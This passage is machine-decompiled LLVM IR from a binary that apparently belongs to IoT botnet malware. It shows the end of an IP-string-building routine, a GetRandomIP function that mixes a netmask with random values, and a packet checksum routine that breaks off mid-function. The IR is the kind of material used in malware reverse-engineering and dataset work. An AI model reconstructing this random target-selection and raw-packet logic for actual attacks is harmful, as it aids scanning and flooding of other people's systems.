  %v3_d79c = load i8, i8* @global_var_299ba.79, align 1
  %v4_d7a8 = sext i8 %v3_d790 to i32
  %v6_d7a8 = sext i8 %v3_d79c to i32
  %v8_d7a8 = call i32 @szprintf(i32 %v2_d784, i32 ptrtoint ([15 x i8]* @global_var_1f470.454 to i32), i32 %v4_d7a8, i32 %v6_d7a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d7ac

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d778, %dec_label_pc_d784
  %v7_d7b0 = icmp eq i32 %v2_acd8, 200
  br i1 %v7_d7b0, label %dec_label_pc_d7b8, label %dec_label_pc_d7e0

dec_label_pc_d7b8:                                ; preds = %dec_label_pc_d7ac
  %v2_d7b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d7c4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d7d0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d7dc = sext i8 %v3_d7c4 to i32
  %v6_d7dc = sext i8 %v3_d7d0 to i32
  %v8_d7dc = call i32 @szprintf(i32 %v2_d7b8, i32 ptrtoint ([15 x i8]* @global_var_1f480.456 to i32), i32 %v4_d7dc, i32 %v6_d7dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d7e0

dec_label_pc_d7e0:                                ; preds = %dec_label_pc_d7ac, %dec_label_pc_d7b8
  %v7_d7e4 = icmp eq i32 %v2_acd8, 201
  br i1 %v7_d7e4, label %dec_label_pc_d820, label %dec_label_pc_d814

dec_label_pc_d814:                                ; preds = %dec_label_pc_d7e0
  br label %dec_label_pc_d848

dec_label_pc_d820:                                ; preds = %dec_label_pc_d7e0
  %v2_d7ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_d7f8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d804 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d810 = sext i8 %v3_d7f8 to i32
  %v6_d810 = sext i8 %v3_d804 to i32
  %v8_d810 = call i32 @szprintf(i32 %v2_d7ec, i32 ptrtoint ([15 x i8]* @global_var_1f490.458 to i32), i32 %v4_d810, i32 %v6_d810, i32 ptrtoint (i32* @0 to i32))
  %v3_d82c = load i8, i8* @global_var_299b9.78, align 1
  %v3_d838 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d844 = sext i8 %v3_d82c to i32
  %v6_d844 = sext i8 %v3_d838 to i32
  %v8_d844 = call i32 @szprintf(i32 %v2_d7ec, i32 ptrtoint ([13 x i8]* @global_var_1f4a0.460 to i32), i32 %v4_d844, i32 %v6_d844, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d848

dec_label_pc_d848:                                ; preds = %dec_label_pc_d814, %dec_label_pc_d820
  %v7_d84c = icmp eq i32 %v2_acd8, 202
  br i1 %v7_d84c, label %dec_label_pc_d854, label %dec_label_pc_d87c

dec_label_pc_d854:                                ; preds = %dec_label_pc_d848
  %v2_d854 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d860 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d86c = load i8, i8* @global_var_299ba.79, align 1
  %v4_d878 = sext i8 %v3_d860 to i32
  %v6_d878 = sext i8 %v3_d86c to i32
  %v8_d878 = call i32 @szprintf(i32 %v2_d854, i32 ptrtoint ([14 x i8]* @global_var_1ead8.137 to i32), i32 %v4_d878, i32 %v6_d878, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d87c

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d848, %dec_label_pc_d854
  %v7_d880 = icmp eq i32 %v2_acd8, 203
  br i1 %v7_d880, label %dec_label_pc_d888, label %dec_label_pc_d8b0

dec_label_pc_d888:                                ; preds = %dec_label_pc_d87c
  %v2_d888 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d894 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d8a0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d8ac = sext i8 %v3_d894 to i32
  %v6_d8ac = sext i8 %v3_d8a0 to i32
  %v8_d8ac = call i32 @szprintf(i32 %v2_d888, i32 ptrtoint ([13 x i8]* @global_var_1f4b0.463 to i32), i32 %v4_d8ac, i32 %v6_d8ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d8b0

dec_label_pc_d8b0:                                ; preds = %dec_label_pc_d87c, %dec_label_pc_d888
  %v7_d8b4 = icmp eq i32 %v2_acd8, 204
  br i1 %v7_d8b4, label %dec_label_pc_d8bc, label %dec_label_pc_d8e4

dec_label_pc_d8bc:                                ; preds = %dec_label_pc_d8b0
  %v2_d8bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_d8c8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d8d4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d8e0 = sext i8 %v3_d8c8 to i32
  %v6_d8e0 = sext i8 %v3_d8d4 to i32
  %v8_d8e0 = call i32 @szprintf(i32 %v2_d8bc, i32 ptrtoint ([13 x i8]* @global_var_1f4c0.465 to i32), i32 %v4_d8e0, i32 %v6_d8e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d8e4

dec_label_pc_d8e4:                                ; preds = %dec_label_pc_d8b0, %dec_label_pc_d8bc
  %v7_d8e8 = icmp eq i32 %v2_acd8, 205
  br i1 %v7_d8e8, label %dec_label_pc_d8f0, label %dec_label_pc_d918

dec_label_pc_d8f0:                                ; preds = %dec_label_pc_d8e4
  %v2_d8f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d8fc = load i8, i8* @global_var_299b9.78, align 1
  %v3_d908 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d914 = sext i8 %v3_d8fc to i32
  %v6_d914 = sext i8 %v3_d908 to i32
  %v8_d914 = call i32 @szprintf(i32 %v2_d8f0, i32 ptrtoint ([13 x i8]* @global_var_1f4d0.467 to i32), i32 %v4_d914, i32 %v6_d914, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d918

dec_label_pc_d918:                                ; preds = %dec_label_pc_d8e4, %dec_label_pc_d8f0
  %v7_d91c = icmp eq i32 %v2_acd8, 206
  br i1 %v7_d91c, label %dec_label_pc_d924, label %dec_label_pc_d94c

dec_label_pc_d924:                                ; preds = %dec_label_pc_d918
  %v2_d924 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d930 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d93c = load i8, i8* @global_var_299ba.79, align 1
  %v4_d948 = sext i8 %v3_d930 to i32
  %v6_d948 = sext i8 %v3_d93c to i32
  %v8_d948 = call i32 @szprintf(i32 %v2_d924, i32 ptrtoint ([13 x i8]* @global_var_1f4e0.469 to i32), i32 %v4_d948, i32 %v6_d948, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d94c

dec_label_pc_d94c:                                ; preds = %dec_label_pc_d918, %dec_label_pc_d924
  %v7_d950 = icmp eq i32 %v2_acd8, 207
  %v2_d958 = ptrtoint i32* %stack_var_-36 to i32
  br i1 %v7_d950, label %dec_label_pc_d958, label %dec_label_pc_d980

dec_label_pc_d958:                                ; preds = %dec_label_pc_d94c
  %v3_d964 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d970 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d97c = sext i8 %v3_d964 to i32
  %v6_d97c = sext i8 %v3_d970 to i32
  %v8_d97c = call i32 @szprintf(i32 %v2_d958, i32 ptrtoint ([14 x i8]* @global_var_1f4f0.471 to i32), i32 %v4_d97c, i32 %v6_d97c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d980

dec_label_pc_d980:                                ; preds = %dec_label_pc_d94c, %dec_label_pc_d958
  br i1 false, label %dec_label_pc_d98c, label %dec_label_pc_d9b4

dec_label_pc_d98c:                                ; preds = %dec_label_pc_d980
  br label %dec_label_pc_d9b4

dec_label_pc_d9b4:                                ; preds = %dec_label_pc_d980, %dec_label_pc_d98c
  store i32 %v2_d958, i32* @r0, align 4
  %v1_d9bc = call i32 @inet_addr(i32 %v2_d958)
  store i32 %v3_ab54, i32* @fp, align 4
  ret i32 %v1_d9bc

; uselistorder directives
  uselistorder i32 %v2_d958, { 1, 0, 2 }
  uselistorder i32 %v0_ac74, { 1, 0 }
  uselistorder i32 %v0_ac28, { 1, 0 }
  uselistorder i32 %v0_abdc, { 1, 0 }
  uselistorder i32 %v0_ab90, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1f3cc.433 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1f24c.384 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1f1e0.369 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1f050.318 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_1f024.312 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1efc4.300 to i32), { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_1ef64.288 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1ed78.226 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1ed68.224 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1ebc8.171 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1eba8.167 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1eb98.165 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1eb68.159 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1ead8.137 to i32), { 1, 0 }
  uselistorder i8* @global_var_299ba.79, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_299b9.78, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_d9b4, { 1, 0 }
  uselistorder label %dec_label_pc_d980, { 1, 0 }
  uselistorder label %dec_label_pc_d94c, { 1, 0 }
  uselistorder label %dec_label_pc_d918, { 1, 0 }
  uselistorder label %dec_label_pc_d8e4, { 1, 0 }
  uselistorder label %dec_label_pc_d8b0, { 1, 0 }
  uselistorder label %dec_label_pc_d87c, { 1, 0 }
  uselistorder label %dec_label_pc_d848, { 1, 0 }
  uselistorder label %dec_label_pc_d7e0, { 1, 0 }
  uselistorder label %dec_label_pc_d7ac, { 1, 0 }
  uselistorder label %dec_label_pc_d778, { 1, 0 }
  uselistorder label %dec_label_pc_d744, { 1, 0 }
  uselistorder label %dec_label_pc_d710, { 1, 0 }
  uselistorder label %dec_label_pc_d6dc, { 1, 0 }
  uselistorder label %dec_label_pc_d6a8, { 1, 0 }
  uselistorder label %dec_label_pc_d674, { 1, 0 }
  uselistorder label %dec_label_pc_d640, { 1, 0 }
  uselistorder label %dec_label_pc_d60c, { 1, 0 }
  uselistorder label %dec_label_pc_d5d8, { 1, 0 }
  uselistorder label %dec_label_pc_d5a4, { 1, 0 }
  uselistorder label %dec_label_pc_d570, { 1, 0 }
  uselistorder label %dec_label_pc_d53c, { 1, 0 }
  uselistorder label %dec_label_pc_d508, { 1, 0 }
  uselistorder label %dec_label_pc_d4d4, { 1, 0 }
  uselistorder label %dec_label_pc_d4a0, { 1, 0 }
  uselistorder label %dec_label_pc_d46c, { 1, 0 }
  uselistorder label %dec_label_pc_d438, { 1, 0 }
  uselistorder label %dec_label_pc_d404, { 1, 0 }
  uselistorder label %dec_label_pc_d3d0, { 1, 0 }
  uselistorder label %dec_label_pc_d39c, { 1, 0 }
  uselistorder label %dec_label_pc_d368, { 1, 0 }
  uselistorder label %dec_label_pc_d334, { 1, 0 }
  uselistorder label %dec_label_pc_d300, { 1, 0 }
  uselistorder label %dec_label_pc_d2cc, { 1, 0 }
  uselistorder label %dec_label_pc_d298, { 1, 0 }
  uselistorder label %dec_label_pc_d264, { 1, 0 }
  uselistorder label %dec_label_pc_d230, { 1, 0 }
  uselistorder label %dec_label_pc_d1fc, { 1, 0 }
  uselistorder label %dec_label_pc_d1c8, { 1, 0 }
  uselistorder label %dec_label_pc_d194, { 1, 0 }
  uselistorder label %dec_label_pc_d160, { 1, 0 }
  uselistorder label %dec_label_pc_d12c, { 1, 0 }
  uselistorder label %dec_label_pc_d0f8, { 1, 0 }
  uselistorder label %dec_label_pc_d0c4, { 1, 0 }
  uselistorder label %dec_label_pc_d090, { 1, 0 }
  uselistorder label %dec_label_pc_d05c, { 1, 0 }
  uselistorder label %dec_label_pc_d028, { 1, 0 }
  uselistorder label %dec_label_pc_cff4, { 1, 0 }
  uselistorder label %dec_label_pc_cfc0, { 1, 0 }
  uselistorder label %dec_label_pc_cf8c, { 1, 0 }
  uselistorder label %dec_label_pc_cf58, { 1, 0 }
  uselistorder label %dec_label_pc_cf24, { 1, 0 }
  uselistorder label %dec_label_pc_cef0, { 1, 0 }
  uselistorder label %dec_label_pc_cebc, { 1, 0 }
  uselistorder label %dec_label_pc_ce88, { 1, 0 }
  uselistorder label %dec_label_pc_ce54, { 1, 0 }
  uselistorder label %dec_label_pc_ce20, { 1, 0 }
  uselistorder label %dec_label_pc_cdec, { 1, 0 }
  uselistorder label %dec_label_pc_cdb8, { 1, 0 }
  uselistorder label %dec_label_pc_cd84, { 1, 0 }
  uselistorder label %dec_label_pc_cd50, { 1, 0 }
  uselistorder label %dec_label_pc_cd1c, { 1, 0 }
  uselistorder label %dec_label_pc_cce8, { 1, 0 }
  uselistorder label %dec_label_pc_ccb4, { 1, 0 }
  uselistorder label %dec_label_pc_cc80, { 1, 0 }
  uselistorder label %dec_label_pc_cc4c, { 1, 0 }
  uselistorder label %dec_label_pc_cc18, { 1, 0 }
  uselistorder label %dec_label_pc_cbe4, { 1, 0 }
  uselistorder label %dec_label_pc_cbb0, { 1, 0 }
  uselistorder label %dec_label_pc_cb7c, { 1, 0 }
  uselistorder label %dec_label_pc_cb48, { 1, 0 }
  uselistorder label %dec_label_pc_cb14, { 1, 0 }
  uselistorder label %dec_label_pc_cae0, { 1, 0 }
  uselistorder label %dec_label_pc_caac, { 1, 0 }
  uselistorder label %dec_label_pc_ca78, { 1, 0 }
  uselistorder label %dec_label_pc_ca44, { 1, 0 }
  uselistorder label %dec_label_pc_ca10, { 1, 0 }
  uselistorder label %dec_label_pc_c9dc, { 1, 0 }
  uselistorder label %dec_label_pc_c9a8, { 1, 0 }
  uselistorder label %dec_label_pc_c974, { 1, 0 }
  uselistorder label %dec_label_pc_c940, { 1, 0 }
  uselistorder label %dec_label_pc_c90c, { 1, 0 }
  uselistorder label %dec_label_pc_c8d8, { 1, 0 }
  uselistorder label %dec_label_pc_c8a4, { 1, 0 }
  uselistorder label %dec_label_pc_c870, { 1, 0 }
  uselistorder label %dec_label_pc_c83c, { 1, 0 }
  uselistorder label %dec_label_pc_c808, { 1, 0 }
  uselistorder label %dec_label_pc_c7d4, { 1, 0 }
  uselistorder label %dec_label_pc_c7a0, { 1, 0 }
  uselistorder label %dec_label_pc_c76c, { 1, 0 }
  uselistorder label %dec_label_pc_c738, { 1, 0 }
  uselistorder label %dec_label_pc_c704, { 1, 0 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c69c, { 1, 0 }
  uselistorder label %dec_label_pc_c668, { 1, 0 }
  uselistorder label %dec_label_pc_c634, { 1, 0 }
  uselistorder label %dec_label_pc_c600, { 1, 0 }
  uselistorder label %dec_label_pc_c5cc, { 1, 0 }
  uselistorder label %dec_label_pc_c598, { 1, 0 }
  uselistorder label %dec_label_pc_c564, { 1, 0 }
  uselistorder label %dec_label_pc_c530, { 1, 0 }
  uselistorder label %dec_label_pc_c4fc, { 1, 0 }
  uselistorder label %dec_label_pc_c4c8, { 1, 0 }
  uselistorder label %dec_label_pc_c494, { 1, 0 }
  uselistorder label %dec_label_pc_c460, { 1, 0 }
  uselistorder label %dec_label_pc_c42c, { 1, 0 }
  uselistorder label %dec_label_pc_c3f8, { 1, 0 }
  uselistorder label %dec_label_pc_c3c4, { 1, 0 }
  uselistorder label %dec_label_pc_c390, { 1, 0 }
  uselistorder label %dec_label_pc_c35c, { 1, 0 }
  uselistorder label %dec_label_pc_c328, { 1, 0 }
  uselistorder label %dec_label_pc_c2f4, { 1, 0 }
  uselistorder label %dec_label_pc_c2c0, { 1, 0 }
  uselistorder label %dec_label_pc_c28c, { 1, 0 }
  uselistorder label %dec_label_pc_c258, { 1, 0 }
  uselistorder label %dec_label_pc_c224, { 1, 0 }
  uselistorder label %dec_label_pc_c1f0, { 1, 0 }
  uselistorder label %dec_label_pc_c1bc, { 1, 0 }
  uselistorder label %dec_label_pc_c188, { 1, 0 }
  uselistorder label %dec_label_pc_c154, { 1, 0 }
  uselistorder label %dec_label_pc_c120, { 1, 0 }
  uselistorder label %dec_label_pc_c0ec, { 1, 0 }
  uselistorder label %dec_label_pc_c0b8, { 1, 0 }
  uselistorder label %dec_label_pc_c084, { 1, 0 }
  uselistorder label %dec_label_pc_c050, { 1, 0 }
  uselistorder label %dec_label_pc_c01c, { 1, 0 }
  uselistorder label %dec_label_pc_bfe8, { 1, 0 }
  uselistorder label %dec_label_pc_bfb4, { 1, 0 }
  uselistorder label %dec_label_pc_bf80, { 1, 0 }
  uselistorder label %dec_label_pc_bf4c, { 1, 0 }
  uselistorder label %dec_label_pc_bf18, { 1, 0 }
  uselistorder label %dec_label_pc_bee4, { 1, 0 }
  uselistorder label %dec_label_pc_beb0, { 1, 0 }
  uselistorder label %dec_label_pc_be7c, { 1, 0 }
  uselistorder label %dec_label_pc_be48, { 1, 0 }
  uselistorder label %dec_label_pc_be14, { 1, 0 }
  uselistorder label %dec_label_pc_bde0, { 1, 0 }
  uselistorder label %dec_label_pc_bdac, { 1, 0 }
  uselistorder label %dec_label_pc_bd78, { 1, 0 }
  uselistorder label %dec_label_pc_bb00, { 1, 0 }
  uselistorder label %dec_label_pc_bacc, { 1, 0 }
  uselistorder label %dec_label_pc_ba98, { 1, 0 }
  uselistorder label %dec_label_pc_ba64, { 1, 0 }
  uselistorder label %dec_label_pc_ba30, { 1, 0 }
  uselistorder label %dec_label_pc_b9fc, { 1, 0 }
  uselistorder label %dec_label_pc_b9c8, { 1, 0 }
  uselistorder label %dec_label_pc_b994, { 1, 0 }
  uselistorder label %dec_label_pc_b960, { 1, 0 }
  uselistorder label %dec_label_pc_b92c, { 1, 0 }
  uselistorder label %dec_label_pc_b8f8, { 1, 0 }
  uselistorder label %dec_label_pc_b8c4, { 1, 0 }
  uselistorder label %dec_label_pc_b890, { 1, 0 }
  uselistorder label %dec_label_pc_b85c, { 1, 0 }
  uselistorder label %dec_label_pc_b828, { 1, 0 }
  uselistorder label %dec_label_pc_b7f4, { 1, 0 }
  uselistorder label %dec_label_pc_b7c0, { 1, 0 }
  uselistorder label %dec_label_pc_b78c, { 1, 0 }
  uselistorder label %dec_label_pc_b758, { 1, 0 }
  uselistorder label %dec_label_pc_b724, { 1, 0 }
  uselistorder label %dec_label_pc_b6f0, { 1, 0 }
  uselistorder label %dec_label_pc_b6bc, { 1, 0 }
  uselistorder label %dec_label_pc_b688, { 1, 0 }
  uselistorder label %dec_label_pc_b654, { 1, 0 }
  uselistorder label %dec_label_pc_b620, { 1, 0 }
  uselistorder label %dec_label_pc_b5ec, { 1, 0 }
  uselistorder label %dec_label_pc_b5b8, { 1, 0 }
  uselistorder label %dec_label_pc_b584, { 1, 0 }
  uselistorder label %dec_label_pc_b550, { 1, 0 }
  uselistorder label %dec_label_pc_b51c, { 1, 0 }
  uselistorder label %dec_label_pc_b4e8, { 1, 0 }
  uselistorder label %dec_label_pc_b4b4, { 1, 0 }
  uselistorder label %dec_label_pc_b480, { 1, 0 }
  uselistorder label %dec_label_pc_b44c, { 1, 0 }
  uselistorder label %dec_label_pc_b418, { 1, 0 }
  uselistorder label %dec_label_pc_b3e4, { 1, 0 }
  uselistorder label %dec_label_pc_b3b0, { 1, 0 }
  uselistorder label %dec_label_pc_b37c, { 1, 0 }
  uselistorder label %dec_label_pc_b348, { 1, 0 }
  uselistorder label %dec_label_pc_b314, { 1, 0 }
  uselistorder label %dec_label_pc_b2e0, { 1, 0 }
  uselistorder label %dec_label_pc_b2ac, { 1, 0 }
  uselistorder label %dec_label_pc_b278, { 1, 0 }
  uselistorder label %dec_label_pc_b244, { 1, 0 }
  uselistorder label %dec_label_pc_b210, { 1, 0 }
  uselistorder label %dec_label_pc_b1dc, { 1, 0 }
  uselistorder label %dec_label_pc_b1a8, { 1, 0 }
  uselistorder label %dec_label_pc_b174, { 1, 0 }
  uselistorder label %dec_label_pc_b140, { 1, 0 }
  uselistorder label %dec_label_pc_b10c, { 1, 0 }
  uselistorder label %dec_label_pc_b0d8, { 1, 0 }
  uselistorder label %dec_label_pc_b0a4, { 1, 0 }
  uselistorder label %dec_label_pc_b070, { 1, 0 }
  uselistorder label %dec_label_pc_b03c, { 1, 0 }
  uselistorder label %dec_label_pc_b008, { 1, 0 }
  uselistorder label %dec_label_pc_afd4, { 1, 0 }
  uselistorder label %dec_label_pc_afa0, { 1, 0 }
  uselistorder label %dec_label_pc_af6c, { 1, 0 }
  uselistorder label %dec_label_pc_af38, { 1, 0 }
  uselistorder label %dec_label_pc_af04, { 1, 0 }
  uselistorder label %dec_label_pc_aed0, { 1, 0 }
  uselistorder label %dec_label_pc_ae9c, { 1, 0 }
  uselistorder label %dec_label_pc_ae68, { 1, 0 }
  uselistorder label %dec_label_pc_ae34, { 1, 0 }
  uselistorder label %dec_label_pc_ae00, { 1, 0 }
  uselistorder label %dec_label_pc_adcc, { 1, 0 }
  uselistorder label %dec_label_pc_ad98, { 1, 0 }
  uselistorder label %dec_label_pc_ad64, { 1, 0 }
  uselistorder label %dec_label_pc_ad30, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_dac0 = load i32, i32* @fp, align 4
  %v2_dad4 = load i32, i32* @global_var_2fbfc.475, align 4
  %v1_dadc = call i32 @__GI_ntohl(i32 %v2_dad4)
  %v2_dae8 = and i32 %v1_dadc, %arg1
  %v0_daf0 = call i32 @rand_cmwc()
  %v1_dafc = sub i32 -1, %arg1
  %v2_db00 = and i32 %v0_daf0, %v1_dafc
  %v2_db08 = xor i32 %v2_db00, %v2_dae8
  store i32 %v3_dac0, i32* @fp, align 4
  ret i32 %v2_db08
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_db949 = icmp sgt i32 %arg2, 1
  br i1 %v8_db949, label %dec_label_pc_db4c, label %dec_label_pc_db98

dec_label_pc_db4c:                                ; preds = %entry, %dec_label_pc_db4c
  %v2_db60 = phi i32 [ %v2_db64, %dec_label_pc_db4c ], [ 0, %entry ]
  %stack_var_-44.012 = phi i32 [ %v5_db68, %dec_label_pc_db4c ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v1_db84, %dec_label_pc_db4c ], [ %arg2, %entry ]
  %stack_var_-36.010 = phi i16* [ %v5_db7c, %dec_label_pc_db4c ], [ %arg1, %entry ]
  %v4_db4c = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_db50 = load i16, i16* %stack_var_-36.010, align 2
  %v3_db50 = zext i16 %v2_db50 to i32
  %v2_db64 = add i32 %v3_db50, %v2_db60
  %v3_db64 = icmp ult i32 %v2_db64, %v2_db60
  %v4_db68 = zext i1 %v3_db64 to i32
  %v5_db68 = add i32 %v4_db68, %stack_var_-44.012
  %v1_db78 = add i32 %v4_db4c, 2
  %v5_db7c = inttoptr i32 %v1_db78 to i16*
  %v1_db84 = add nsw i32 %stack_var_-40.011, -2
  %v8_db94 = icmp sgt i32 %v1_db84, 1
  br i1 %v8_db94, label %dec_label_pc_db4c, label %dec_label_pc_db8c.dec_label_pc_db98_crit_edge

dec_label_pc_db8c.dec_label_pc_db98_crit_edge:    ; preds = %dec_label_pc_db4c
  br label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db8c.dec_label_pc_db98_crit_edge, %entry
  %v2_dbb8 = phi i32 [ %v2_db64, %dec_label_pc_db8c.dec_label_pc_db98_crit_edge ], [ 0, %entry ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_db7c, %dec_label_pc_db8c.dec_label_pc_db98_crit_edge ], [ %arg1, %entry ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_db68, %dec_label_pc_db8c.dec_label_pc_db98_crit_edge ], [ 0, %entry ]
  %v7_db90.lcssa.in = phi i32 [ %v1_db84, %dec_label_pc_db8c.dec_label_pc_db98_crit_edge ], [ %arg2, %entry ]
  %v7_db90.lcssa = icmp eq i32 %v7_db90.lcssa.in, 1
  br i1 %v7_db90.lcssa, label %dec_label_pc_dba4, label %dec_label_pc_dc20.preheader

dec_label_pc_dba4:                                ; preds = %dec_label_pc_db98
  %v1_dba8 = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_dba8 = load i8, i8* %v1_dba8, align 1
  %v3_dba8 = zext i8 %v2_dba8 to i32
  %v2_dbbc = add i32 %v3_dba8, %v2_dbb8
  %v3_dbbc = icmp ult i32 %v2_dbbc, %v2_dbb8
  %v4_dbc0 = zext i1 %v3_dbbc to i32
  %v5_dbc0 = add i32 %v4_dbc0, %stack_var_-44.0.lcssa
  br label %dec_label_pc_dc20.preheader

dec_label_pc_dc20.preheader:                      ; preds = %dec_label_pc_dba4, %dec_label_pc_db98
  %v3_dc4c.ph = phi i32 [ %v2_dbb8, %dec_label_pc_db98 ], [ %v2_dbbc, %dec_label_pc_dba4 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_db98 ], [ %v5_dbc0, %dec_label_pc_dba4 ]
  %v3_dc2437 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_dc2c38 = udiv i32 %v3_dc4c.ph, 65536
  %v2_dc3039 = or i32 %v3_dc2437, %v3_dc2c38
  %v3_dc3840 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_dc4041 = or i32 %v2_dc3039, %v3_dc3840
  %v2_dc4442 = icmp eq i32 %v2_dc4041, 0
  br i1 %v2_dc4442, label %dec_label_pc_dc4c, label %dec_label_pc_dbd0

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_dc20.preheader, %dec_label_pc_dbd0
  %v3_dc3845 = phi i32 [ %v3_dc38, %dec_label_pc_dbd0 ], [ %v3_dc3840, %dec_label_pc_dc20.preheader ]
  %v2_dc3044 = phi i32 [ %v2_dc30, %dec_label_pc_dbd0 ], [ %v2_dc3039, %dec_label_pc_dc20.preheader ]
  %v3_dc4c43 = phi i32 [ %v2_dc10, %dec_label_pc_dbd0 ], [ %v3_dc4c.ph, %dec_label_pc_dc20.preheader ]
  %v2_dbe4 = urem i32 %v3_dc4c43, 65536
  %v2_dc10 = add i32 %v2_dc3044, %v2_dbe4
  %v3_dc10 = icmp ult i32 %v2_dc10, %v2_dbe4
  %v4_dc14 = zext i1 %v3_dc10 to i32
  %v5_dc14 = add nuw nsw i32 %v4_dc14, %v3_dc3845
  %v3_dc24 = mul i32 %v5_dc14, 65536
